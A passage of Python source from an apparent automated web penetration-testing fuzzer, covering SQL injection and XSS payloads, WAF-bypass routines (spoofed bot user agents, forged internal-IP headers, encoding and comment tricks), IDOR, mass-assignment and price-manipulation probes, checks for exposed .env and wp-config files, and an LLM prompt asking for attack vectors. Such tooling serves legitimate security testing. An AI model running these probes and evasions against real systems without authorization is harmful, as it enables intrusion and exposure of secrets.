                })
        
        # Identify interesting responses
        results['interesting_responses'] = self._identify_interesting_responses(results['responses'])
        
        return results

    async def _test_payload_variations(self, param: str, payload: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test payload in different variations (GET, POST, headers, etc.)"""
        test_results = []
        payload_value = payload['value']
        
        # Test variations
        variations = [
            ('GET_param', lambda: self.session.get(f"{self.target_url}?{param}={quote(payload_value)}")),
            ('POST_param', lambda: self.session.post(self.target_url, data={param: payload_value})),
            ('JSON_param', lambda: self.session.post(self.target_url, json={param: payload_value})),
            ('Header', lambda: self.session.get(self.target_url, headers={f"X-{param}": payload_value})),
        ]
        
        for variation_name, request_func in variations:
            try:
                response = request_func()
                
                test_result = {
                    'parameter': param,
                    'payload': payload,
                    'variation': variation_name,
                    'status_code': response.status_code,
                    'response_size': len(response.content),
                    'response_time': response.elapsed.total_seconds(),
                    'headers': dict(response.headers),
                    'content_snippet': response.text[:500] if response.text else '',
                    'timestamp': time.time()
                }
                
                test_results.append(test_result)
                
            except Exception as e:
                test_results.append({
                    'parameter': param,
                    'payload': payload,
                    'variation': variation_name,
                    'error': str(e),
                    'timestamp': time.time()
                })
        
        return test_results

    def _identify_interesting_responses(self, responses: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Identify interesting responses that might indicate vulnerabilities"""
        interesting = []
        
        # Baseline response (empty parameter)
        baseline_responses = [r for r in responses if r.get('payload', {}).get('type') == 'empty']
        baseline_status = baseline_responses[0]['status_code'] if baseline_responses else 200
        baseline_size = baseline_responses[0]['response_size'] if baseline_responses else 0
        
        for response in responses:
            if 'error' in response:
                continue
            
            interesting_indicators = []
            
            # Status code changes
            if response['status_code'] != baseline_status:
                interesting_indicators.append(f"Status code changed: {baseline_status} -> {response['status_code']}")
            
            # Significant size changes
            size_diff = abs(response['response_size'] - baseline_size)
            if size_diff > 100:  # More than 100 bytes difference
                interesting_indicators.append(f"Response size changed by {size_diff} bytes")
            
            # Error patterns in content
            error_patterns = [
                'error', 'exception', 'warning', 'fatal', 'mysql', 'postgresql',
                'oracle', 'sqlite', 'syntax error', 'parse error', 'undefined',
                'stack trace', 'debug', 'line', 'file'
            ]
            
            content_lower = response.get('content_snippet', '').lower()
            for pattern in error_patterns:
                if pattern in content_lower:
                    interesting_indicators.append(f"Error pattern detected: {pattern}")
                    break
            
            # Security-related headers
            security_headers = ['x-frame-options', 'content-security-policy', 'x-xss-protection']
            for header in security_headers:
                if header in response.get('headers', {}):
                    interesting_indicators.append(f"Security header present: {header}")
            
            # Response time anomalies
            if response['response_time'] > 5.0:  # More than 5 seconds
                interesting_indicators.append(f"Slow response: {response['response_time']:.2f}s")
            
            if interesting_indicators:
                interesting.append({
                    'response': response,
                    'indicators': interesting_indicators,
                    'risk_level': self._assess_response_risk(interesting_indicators)
                })
        
        return interesting

    def _assess_response_risk(self, indicators: List[str]) -> str:
        """Assess risk level based on response indicators"""
        high_risk_patterns = ['error', 'exception', 'mysql', 'postgresql', 'stack trace']
        medium_risk_patterns = ['status code changed', 'size changed', 'slow response']
        
        for indicator in indicators:
            indicator_lower = indicator.lower()
            if any(pattern in indicator_lower for pattern in high_risk_patterns):
                return 'high'
        
        for indicator in indicators:
            indicator_lower = indicator.lower()
            if any(pattern in indicator_lower for pattern in medium_risk_patterns):
                return 'medium'
        
        return 'low'

    def _analyze_parameter_results(self, param: str, results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Analyze parameter test results for potential vulnerabilities"""
        vulnerabilities = []
        
        for interesting_response in results.get('interesting_responses', []):
            response = interesting_response['response']
            indicators = interesting_response['indicators']
            
            # Determine vulnerability type based on payload and response
            payload_type = response.get('payload', {}).get('type', 'unknown')
            vuln_info = {
                'parameter': param,
                'vulnerability_type': self._map_payload_to_vulnerability(payload_type),
                'payload': response.get('payload', {}),
                'evidence': indicators,
                'risk_level': interesting_response['risk_level'],
                'response_details': {
                    'status_code': response['status_code'],
                    'response_size': response['response_size'],
                    'variation': response['variation']
                }
            }
            
            vulnerabilities.append(vuln_info)
        
        return vulnerabilities

    def _map_payload_to_vulnerability(self, payload_type: str) -> str:
        """Map payload type to vulnerability type"""
        mapping = {
            'sqli': 'SQL Injection',
            'xss': 'Cross-Site Scripting',
            'lfi': 'Local File Inclusion',
            'rfi': 'Remote File Inclusion',
            'idor': 'Insecure Direct Object Reference',
            'open_redirect': 'Open Redirect',
            'ssrf': 'Server-Side Request Forgery',
            'ssti': 'Server-Side Template Injection',
            'email_injection': 'Email Header Injection',
            'log4j': 'Log4j Injection'
        }
        
        return mapping.get(payload_type, 'Unknown Vulnerability')

    async def _test_waf_bypass_techniques(self) -> Dict[str, Any]:
        """Test various WAF bypass techniques"""
        logger.info("Testing WAF bypass techniques")
        
        bypass_results = {
            'techniques_tested': [],
            'successful_bypasses': [],
            'failed_bypasses': [],
            'recommendations': []
        }
        
        # WAF bypass techniques
        bypass_techniques = [
            ('user_agent_rotation', self._test_user_agent_bypass),
            ('header_manipulation', self._test_header_manipulation_bypass),
            ('encoding_bypass', self._test_encoding_bypass),
            ('fragmentation', self._test_fragmentation_bypass),
            ('case_variation', self._test_case_variation_bypass),
            ('comment_insertion', self._test_comment_insertion_bypass)
        ]
        
        for technique_name, technique_func in bypass_techniques:
            try:
                logger.info(f"Testing {technique_name} bypass technique")
                result = await technique_func()
                
                bypass_results['techniques_tested'].append(technique_name)
                
                if result.get('success'):
                    bypass_results['successful_bypasses'].append({
                        'technique': technique_name,
                        'details': result
                    })
                else:
                    bypass_results['failed_bypasses'].append({
                        'technique': technique_name,
                        'details': result
                    })
                
            except Exception as e:
                logger.error(f"WAF bypass technique {technique_name} failed: {e}")
                bypass_results['failed_bypasses'].append({
                    'technique': technique_name,
                    'error': str(e)
                })
        
        # Generate recommendations
        bypass_results['recommendations'] = self._generate_bypass_recommendations(bypass_results)
        
        return bypass_results

    async def _test_user_agent_bypass(self) -> Dict[str, Any]:
        """Test user agent rotation for WAF bypass"""
        user_agents = [
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'curl/7.68.0',
            'python-requests/2.25.1'
        ]
        
        test_payload = "' OR '1'='1"
        baseline_blocked = False
        
        # Test baseline (current user agent)
        try:
            response = self.session.get(f"{self.target_url}?test={quote(test_payload)}")
            baseline_blocked = response.status_code in [403, 406, 429]
        except:
            pass
        
        if not baseline_blocked:
            return {'success': False, 'reason': 'Baseline request not blocked'}
        
        # Test different user agents
        for ua in user_agents:
            try:
                headers = {'User-Agent': ua}
                response = self.session.get(f"{self.target_url}?test={quote(test_payload)}", headers=headers)
                
                if response.status_code not in [403, 406, 429]:
                    return {
                        'success': True,
                        'bypassed_with': ua,
                        'status_code': response.status_code
                    }
            except:
                continue
        
        return {'success': False, 'reason': 'No user agent bypass found'}

    async def _test_header_manipulation_bypass(self) -> Dict[str, Any]:
        """Test header manipulation for WAF bypass"""
        test_payload = "<script>alert(1)</script>"
        
        header_variations = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'Host': 'localhost'},
            {'Content-Type': 'application/json; charset=utf-8'},
            {'Accept': 'application/json, text/plain, */*'},
            {'X-Requested-With': 'XMLHttpRequest'}
        ]
        
        # Test baseline
        try:
            response = self.session.get(f"{self.target_url}?test={quote(test_payload)}")
            baseline_blocked = response.status_code in [403, 406, 429]
        except:
            baseline_blocked = True
        
        if not baseline_blocked:
            return {'success': False, 'reason': 'Baseline request not blocked'}
        
        # Test header variations
        for headers in header_variations:
            try:
                response = self.session.get(f"{self.target_url}?test={quote(test_payload)}", headers=headers)
                
                if response.status_code not in [403, 406, 429]:
                    return {
                        'success': True,
                        'bypassed_with_headers': headers,
                        'status_code': response.status_code
                    }
            except:
                continue
        
        return {'success': False, 'reason': 'No header manipulation bypass found'}

    async def _test_encoding_bypass(self) -> Dict[str, Any]:
        """Test various encoding techniques for WAF bypass"""
        base_payload = "<script>alert(1)</script>"
        
        encoding_variations = [
            ('URL encoding', quote(base_payload)),
            ('Double URL encoding', quote(quote(base_payload))),
            ('HTML entity encoding', base_payload.replace('<', '&lt;').replace('>', '&gt;')),
            ('Unicode encoding', base_payload.replace('<', '\\u003c').replace('>', '\\u003e')),
            ('Hex encoding', ''.join(f'%{ord(c):02x}' for c in base_payload)),
            ('Mixed case', base_payload.replace('script', 'ScRiPt')),
        ]
        
        # Test baseline
        try:
            response = self.session.get(f"{self.target_url}?test={quote(base_payload)}")
            baseline_blocked = response.status_code in [403, 406, 429]
        except:
            baseline_blocked = True
        
        if not baseline_blocked:
            return {'success': False, 'reason': 'Baseline request not blocked'}
        
        # Test encoding variations
        for encoding_name, encoded_payload in encoding_variations:
            try:
                response = self.session.get(f"{self.target_url}?test={encoded_payload}")
                
                if response.status_code not in [403, 406, 429]:
                    return {
                        'success': True,
                        'bypassed_with_encoding': encoding_name,
                        'encoded_payload': encoded_payload,
                        'status_code': response.status_code
                    }
            except:
                continue
        
        return {'success': False, 'reason': 'No encoding bypass found'}

    async def _test_fragmentation_bypass(self) -> Dict[str, Any]:
        """Test payload fragmentation for WAF bypass"""
        # This is a simplified version - in practice, you'd need more sophisticated fragmentation
        base_payload = "' OR '1'='1"
        
        fragmentation_techniques = [
            ('Parameter splitting', [('te', "'"), ('st', " OR "), ('val', "'1'='1")]),
            ('Multiple parameters', [('a', "'"), ('b', "OR"), ('c', "'1'='1")]),
        ]
        
        # Test baseline
        try:
            response = self.session.get(f"{self.target_url}?test={quote(base_payload)}")
            baseline_blocked = response.status_code in [403, 406, 429]
        except:
            baseline_blocked = True
        
        if not baseline_blocked:
            return {'success': False, 'reason': 'Baseline request not blocked'}
        
        # Test fragmentation
        for technique_name, fragments in fragmentation_techniques:
            try:
                params = '&'.join(f"{k}={quote(v)}" for k, v in fragments)
                response = self.session.get(f"{self.target_url}?{params}")
                
                if response.status_code not in [403, 406, 429]:
                    return {
                        'success': True,
                        'bypassed_with_technique': technique_name,
                        'fragments': fragments,
                        'status_code': response.status_code
                    }
            except:
                continue
        
        return {'success': False, 'reason': 'No fragmentation bypass found'}

    async def _test_case_variation_bypass(self) -> Dict[str, Any]:
        """Test case variation for WAF bypass"""
        base_payload = "union select"
        
        case_variations = [
            'UNION SELECT',
            'Union Select',
            'uNiOn SeLeCt',
            'UnIoN sElEcT',
            'union/**/select',
            'UNION/**/SELECT'
        ]
        
        # Test baseline
        try:
            response = self.session.get(f"{self.target_url}?test={quote(base_payload)}")
            baseline_blocked = response.status_code in [403, 406, 429]
        except:
            baseline_blocked = True
        
        if not baseline_blocked:
            return {'success': False, 'reason': 'Baseline request not blocked'}
        
        # Test case variations
        for variation in case_variations:
            try:
                response = self.session.get(f"{self.target_url}?test={quote(variation)}")
                
                if response.status_code not in [403, 406, 429]:
                    return {
                        'success': True,
                        'bypassed_with_variation': variation,
                        'status_code': response.status_code
                    }
            except:
                continue
        
        return {'success': False, 'reason': 'No case variation bypass found'}

    async def _test_comment_insertion_bypass(self) -> Dict[str, Any]:
        """Test comment insertion for WAF bypass"""
        base_payload = "union select"
        
        comment_variations = [
            'union/**/select',
            'union/*comment*/select',
            'union#comment\nselect',
            'union--comment\nselect',
            'uni/**/on sel/**/ect',
            'un/**/ion se/**/lect'
        ]
        
        # Test baseline
        try:
            response = self.session.get(f"{self.target_url}?test={quote(base_payload)}")
            baseline_blocked = response.status_code in [403, 406, 429]
        except:
            baseline_blocked = True
        
        if not baseline_blocked:
            return {'success': False, 'reason': 'Baseline request not blocked'}
        
        # Test comment variations
        for variation in comment_variations:
            try:
                response = self.session.get(f"{self.target_url}?test={quote(variation)}")
                
                if response.status_code not in [403, 406, 429]:
                    return {
                        'success': True,
                        'bypassed_with_variation': variation,
                        'status_code': response.status_code
                    }
            except:
                continue
        
        return {'success': False, 'reason': 'No comment insertion bypass found'}

    def _generate_bypass_recommendations(self, bypass_results: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on bypass test results"""
        recommendations = []
        
        successful_bypasses = bypass_results.get('successful_bypasses', [])
        
        if successful_bypasses:
            recommendations.append("WAF bypass techniques were successful - consider using these for further testing")
            
            for bypass in successful_bypasses:
                technique = bypass['technique']
                if technique == 'user_agent_rotation':
                    recommendations.append("Use bot user agents for subsequent requests")
                elif technique == 'header_manipulation':
                    recommendations.append("Manipulate IP headers to appear as internal requests")
                elif technique == 'encoding_bypass':
                    recommendations.append("Use encoding techniques to obfuscate payloads")
        else:
            recommendations.append("No WAF bypass techniques were successful - WAF appears well-configured")
            recommendations.append("Consider more advanced bypass techniques or manual testing")
        
        return recommendations

    async def _vulnerability_specific_fuzzing(self) -> Dict[str, Any]:
        """Perform vulnerability-specific fuzzing based on discovered technologies"""
        logger.info("Starting vulnerability-specific fuzzing")
        
        vuln_results = {
            'idor_testing': {},
            'parameter_pollution': {},
            'business_logic_testing': {},
            'api_specific_testing': {},
            'technology_specific_testing': {}
        }
        
        # IDOR Testing
        vuln_results['idor_testing'] = await self._test_idor_vulnerabilities()
        
        # Parameter Pollution Testing
        vuln_results['parameter_pollution'] = await self._test_parameter_pollution()
        
        # Business Logic Testing
        vuln_results['business_logic_testing'] = await self._test_business_logic_flaws()
        
        # API-specific testing if APIs were discovered
        if hasattr(self, 'discovered_apis') and self.discovered_apis:
            vuln_results['api_specific_testing'] = await self._test_api_vulnerabilities()
        
        # Technology-specific testing
        vuln_results['technology_specific_testing'] = await self._test_technology_specific_vulns()
        
        return vuln_results

    async def _test_idor_vulnerabilities(self) -> Dict[str, Any]:
        """Test for Insecure Direct Object Reference vulnerabilities"""
        logger.info("Testing for IDOR vulnerabilities")
        
        idor_results = {
            'endpoints_tested': [],
            'potential_idor': [],
            'access_patterns': {}
        }
        
        # Find ID-like parameters
        id_parameters = [p for p in self.discovered_parameters 
                        if any(pattern in p.lower() for pattern in ['id', 'uid', 'user', 'order', 'account'])]
        
        for param in id_parameters:
            # Test sequential IDs
            test_ids = ['1', '2', '3', '100', '999', '1000']
            
            for test_id in test_ids:
                try:
                    # Test GET request
                    response = self.session.get(f"{self.target_url}?{param}={test_id}")
                    
                    idor_results['endpoints_tested'].append({
                        'parameter': param,
                        'test_id': test_id,
                        'status_code': response.status_code,
                        'response_size': len(response.content)
                    })
                    
                    # Look for successful access patterns
                    if response.status_code == 200 and len(response.content) > 100:
                        idor_results['potential_idor'].append({
                            'parameter': param,
                            'accessible_id': test_id,
                            'response_size': len(response.content),
                            'evidence': 'Successful access to ID-based resource'
                        })
                    
                    await asyncio.sleep(self.request_delay)
                    
                except Exception as e:
                    logger.debug(f"IDOR test error for {param}={test_id}: {e}")
        
        return idor_results

    async def _test_parameter_pollution(self) -> Dict[str, Any]:
        """Test for HTTP Parameter Pollution vulnerabilities"""
        logger.info("Testing for parameter pollution")
        
        pollution_results = {
            'parameters_tested': [],
            'pollution_responses': [],
            'anomalies_detected': []
        }
        
        # Test parameter pollution on discovered parameters
        for param in list(self.discovered_parameters)[:10]:  # Limit to first 10 parameters
            try:
                # Test different pollution techniques
                pollution_tests = [
                    f"{param}=value1&{param}=value2",
                    f"{param}[]=value1&{param}[]=value2",
                    f"{param}.1=value1&{param}.2=value2",
                    f"{param}=value1&{param.upper()}=value2"
                ]
                
                for pollution_test in pollution_tests:
                    response = self.session.get(f"{self.target_url}?{pollution_test}")
                    
                    pollution_results['parameters_tested'].append({
                        'parameter': param,
                        'pollution_technique': pollution_test,
                        'status_code': response.status_code,
                        'response_size': len(response.content)
                    })
                    
                    # Look for anomalies
                    if response.status_code not in [200, 404]:
                        pollution_results['anomalies_detected'].append({
                            'parameter': param,
                            'technique': pollution_test,
                            'anomaly': f"Unexpected status code: {response.status_code}"
                        })
                    
                    await asyncio.sleep(self.request_delay)
                    
            except Exception as e:
                logger.debug(f"Parameter pollution test error for {param}: {e}")
        
        return pollution_results

    async def _test_business_logic_flaws(self) -> Dict[str, Any]:
        """Test for business logic vulnerabilities"""
        logger.info("Testing for business logic flaws")
        
        logic_results = {
            'price_manipulation': [],
            'quantity_manipulation': [],
            'workflow_bypass': [],
            'race_conditions': []
        }
        
        # Look for price/quantity parameters
        price_params = [p for p in self.discovered_parameters 
                       if any(pattern in p.lower() for pattern in ['price', 'amount', 'cost', 'total'])]
        
        quantity_params = [p for p in self.discovered_parameters 
                          if any(pattern in p.lower() for pattern in ['qty', 'quantity', 'count', 'num'])]
        
        # Test price manipulation
        for param in price_params:
            try:
                # Test negative prices
                response = self.session.post(self.target_url, data={param: '-100'})
                logic_results['price_manipulation'].append({
                    'parameter': param,
                    'test_value': '-100',
                    'status_code': response.status_code,
                    'potential_issue': 'Negative price accepted' if response.status_code == 200 else None
                })
                
                # Test zero price
                response = self.session.post(self.target_url, data={param: '0'})
                logic_results['price_manipulation'].append({
                    'parameter': param,
                    'test_value': '0',
                    'status_code': response.status_code,
                    'potential_issue': 'Zero price accepted' if response.status_code == 200 else None
                })
                
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logger.debug(f"Price manipulation test error for {param}: {e}")
        
        # Test quantity manipulation
        for param in quantity_params:
            try:
                # Test negative quantities
                response = self.session.post(self.target_url, data={param: '-1'})
                logic_results['quantity_manipulation'].append({
                    'parameter': param,
                    'test_value': '-1',
                    'status_code': response.status_code,
                    'potential_issue': 'Negative quantity accepted' if response.status_code == 200 else None
                })
                
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logger.debug(f"Quantity manipulation test error for {param}: {e}")
        
        return logic_results

    async def _test_api_vulnerabilities(self) -> Dict[str, Any]:
        """Test API-specific vulnerabilities"""
        logger.info("Testing API-specific vulnerabilities")
        
        api_results = {
            'mass_assignment': [],
            'api_versioning': [],
            'method_override': [],
            'content_type_confusion': []
        }
        
        # Test mass assignment
        common_fields = ['admin', 'role', 'is_admin', 'user_type', 'permissions', 'active']
        
        for field in common_fields:
            try:
                # Test adding admin fields
                response = self.session.post(self.target_url, json={field: True})
                api_results['mass_assignment'].append({
                    'field': field,
                    'test_value': True,
                    'status_code': response.status_code,
                    'potential_issue': 'Mass assignment possible' if response.status_code == 200 else None
                })
                
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logger.debug(f"Mass assignment test error for {field}: {e}")
        
        # Test HTTP method override
        override_headers = [
            {'X-HTTP-Method-Override': 'DELETE'},
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-Method-Override': 'DELETE'},
            {'_method': 'DELETE'}
        ]
        
        for headers in override_headers:
            try:
                response = self.session.post(self.target_url, headers=headers)
                api_results['method_override'].append({
                    'headers': headers,
                    'status_code': response.status_code,
                    'potential_issue': 'Method override accepted' if response.status_code != 405 else None
                })
                
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logger.debug(f"Method override test error: {e}")
        
        return api_results

    async def _test_technology_specific_vulns(self) -> Dict[str, Any]:
        """Test vulnerabilities specific to discovered technologies"""
        logger.info("Testing technology-specific vulnerabilities")
        
        tech_results = {
            'framework_specific': {},
            'server_specific': {},
            'library_specific': {}
        }
        
        # Test based on discovered technologies
        for host, technologies in self.discovered_tech.items():
            for tech in technologies:
                tech_lower = tech.lower()
                
                # WordPress specific tests
                if 'wordpress' in tech_lower:
                    tech_results['framework_specific']['wordpress'] = await self._test_wordpress_vulns()
                
                # Laravel specific tests
                elif 'laravel' in tech_lower:
                    tech_results['framework_specific']['laravel'] = await self._test_laravel_vulns()
                
                # Django specific tests
                elif 'django' in tech_lower:
                    tech_results['framework_specific']['django'] = await self._test_django_vulns()
                
                # Apache specific tests
                elif 'apache' in tech_lower:
                    tech_results['server_specific']['apache'] = await self._test_apache_vulns()
                
                # Nginx specific tests
                elif 'nginx' in tech_lower:
                    tech_results['server_specific']['nginx'] = await self._test_nginx_vulns()
        
        return tech_results

    async def _test_wordpress_vulns(self) -> Dict[str, Any]:
        """Test WordPress-specific vulnerabilities"""
        wp_tests = {
            'wp_admin_access': [],
            'wp_config_exposure': [],
            'plugin_enumeration': []
        }
        
        # Test wp-admin access
        try:
            response = self.session.get(f"{self.target_url}/wp-admin/")
            wp_tests['wp_admin_access'].append({
                'url': f"{self.target_url}/wp-admin/",
                'status_code': response.status_code,
                'accessible': response.status_code == 200
            })
        except:
            pass
        
        # Test wp-config.php exposure
        config_paths = [
            '/wp-config.php',
            '/wp-config.php.bak',
            '/wp-config.txt',
            '/.wp-config.php.swp'
        ]
        
        for path in config_paths:
            try:
                response = self.session.get(f"{self.target_url}{path}")
                wp_tests['wp_config_exposure'].append({
                    'path': path,
                    'status_code': response.status_code,
                    'exposed': response.status_code == 200 and 'DB_PASSWORD' in response.text
                })
            except:
                pass
        
        return wp_tests

    async def _test_laravel_vulns(self) -> Dict[str, Any]:
        """Test Laravel-specific vulnerabilities"""
        laravel_tests = {
            'env_exposure': [],
            'debug_mode': [],
            'route_enumeration': []
        }
        
        # Test .env file exposure
        env_paths = [
            '/.env',
            '/.env.backup',
            '/.env.example',
            '/.env.local'
        ]
        
        for path in env_paths:
            try:
                response = self.session.get(f"{self.target_url}{path}")
                laravel_tests['env_exposure'].append({
                    'path': path,
                    'status_code': response.status_code,
                    'exposed': response.status_code == 200 and 'APP_KEY' in response.text
                })
            except:
                pass
        
        return laravel_tests

    async def _test_django_vulns(self) -> Dict[str, Any]:
        """Test Django-specific vulnerabilities"""
        django_tests = {
            'debug_mode': [],
            'admin_panel': [],
            'settings_exposure': []
        }
        
        # Test Django admin
        try:
            response = self.session.get(f"{self.target_url}/admin/")
            django_tests['admin_panel'].append({
                'url': f"{self.target_url}/admin/",
                'status_code': response.status_code,
                'accessible': response.status_code == 200
            })
        except:
            pass
        
        return django_tests

    async def _test_apache_vulns(self) -> Dict[str, Any]:
        """Test Apache-specific vulnerabilities"""
        apache_tests = {
            'server_status': [],
            'server_info': [],
            'htaccess_exposure': []
        }
        
        # Test server-status
        status_paths = ['/server-status', '/server-info', '/status']
        
        for path in status_paths:
            try:
                response = self.session.get(f"{self.target_url}{path}")
                apache_tests['server_status'].append({
                    'path': path,
                    'status_code': response.status_code,
                    'exposed': response.status_code == 200
                })
            except:
                pass
        
        return apache_tests

    async def _test_nginx_vulns(self) -> Dict[str, Any]:
        """Test Nginx-specific vulnerabilities"""
        nginx_tests = {
            'status_page': [],
            'config_exposure': []
        }
        
        # Test nginx status
        try:
            response = self.session.get(f"{self.target_url}/nginx_status")
            nginx_tests['status_page'].append({
                'url': f"{self.target_url}/nginx_status",
                'status_code': response.status_code,
                'exposed': response.status_code == 200
            })
        except:
            pass
        
        return nginx_tests

    async def _ai_guided_fuzzing(self, previous_results: Dict[str, Any]) -> Dict[str, Any]:
        """Use AI to guide fuzzing based on previous results"""
        if not self.llm_client:
            return {'error': 'No LLM client available'}
        
        logger.info("Starting AI-guided fuzzing")
        
        # Prepare context for AI
        context = {
            'target': self.target_url,
            'discovered_parameters': list(self.discovered_parameters),
            'waf_detected': self.waf_detected,
            'technologies': self.discovered_tech,
            'previous_findings': self._summarize_findings(previous_results)
        }
        
        # AI prompt for guided fuzzing
        prompt = f"""
        Based on the following security testing results, recommend specific fuzzing strategies and payloads:

        Target: {context['target']}
        Parameters Found: {context['discovered_parameters'][:10]}  # First 10 parameters
        WAF Detected: {context['waf_detected']}
        Technologies: {context['technologies']}
        
        Previous Findings Summary:
        {context['previous_findings']}
        
        Recommend:
        1. High-priority parameters to focus on
        2. Specific payload types to test
        3. Attack vectors most likely to succeed
        4. Custom payloads based on the technology stack
        5. Business logic tests specific to this application
        
        Focus on actionable recommendations that could lead to finding exploitable vulnerabilities.
        """
        
        try:
            ai_response = await self.llm_client.agenerate(prompt)
            
            # Execute AI recommendations
            ai_guided_results = await self._execute_ai_recommendations(ai_response)
            
            return {
                'ai_analysis': ai_response,
                'context_provided': context,
                'ai_guided_tests': ai_guided_results,
                'recommendations_executed': True
            }
        except Exception as e:
            logger.error(f"AI-guided fuzzing error: {e}")
            return {'error': str(e)}

    def _summarize_findings(self, results: Dict[str, Any]) -> str:
        """Summarize findings for AI analysis"""
        summary_parts = []
        
        # WAF analysis summary
        if results.get('waf_analysis', {}).get('waf_detected'):
            summary_parts.append(f"WAF detected: {results['waf_analysis'].get('waf_type', 'Unknown')}")
        
        # Parameter discovery summary
        param_count = len(self.discovered_parameters)
        summary_parts.append(f"Parameters discovered: {param_count}")
        
        # Vulnerability findings
        vuln_count = len(results.get('contextual_fuzzing', {}).get('vulnerabilities_found', []))
        if vuln_count > 0:
            summary_parts.append(f"Potential vulnerabilities found: {vuln_count}")
        
        # Bypass techniques
        bypass_success = len(results.get('bypass_techniques', {}).get('successful_bypasses', []))
        if bypass_success > 0:
            summary_parts.append(f"WAF bypass techniques successful: {bypass_success}")
        
        return '; '.join(summary_parts) if summary_parts else 'No significant findings'

    async def _execute_ai_recommendations(self, ai_response: str) -> Dict[str, Any]:
        """Execute AI recommendations (simplified implementation)"""
        # This is a simplified implementation
        # In practice, you would parse the AI response and execute specific tests
        
        execution_results = {
            'ai_recommendations_parsed': True,
            'custom_tests_executed': 0,
            'additional_findings': []
        }
        
        # Look for specific recommendations in AI response
        if 'sql injection' in ai_response.lower():
            # Execute additional SQL injection tests
            execution_results['custom_tests_executed'] += 1
        
        if 'xss' in ai_response.lower():
            # Execute additional XSS tests
            execution_results['custom_tests_executed'] += 1
        
        return execution_results

    def _generate_fuzzing_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate comprehensive summary of fuzzing results"""
        summary = {
            'total_parameters_discovered': len(self.discovered_parameters),
            'waf_detected': self.waf_detected,
            'waf_bypasses_found': len(results.get('bypass_techniques', {}).get('successful_bypasses', [])),
            'potential_vulnerabilities': len(results.get('contextual_fuzzing', {}).get('vulnerabilities_found', [])),
            'idor_tests_performed': len(results.get('vulnerability_testing', {}).get('idor_testing', {}).get('endpoints_tested', [])),
            'business_logic_tests': len(results.get('vulnerability_testing', {}).get('business_logic_testing', {})),
            'high_priority_findings': [],
            'recommended_manual_tests': []
        }
        
        # Identify high priority findings
        vulnerabilities = results.get('contextual_fuzzing', {}).get('vulnerabilities_found', [])
        for vuln in vulnerabilities:
            if vuln.get('risk_level') == 'high':
                summary['high_priority_findings'].append(vuln)
        
        # Generate manual test recommendations
        if self.waf_detected and not results.get('bypass_techniques', {}).get('successful_bypasses'):
            summary['recommended_manual_tests'].append('Manual WAF bypass testing required')
        
        if summary['potential_vulnerabilities'] == 0:
            summary['recommended_manual_tests'].append('Manual parameter testing with custom payloads')
        
        return summary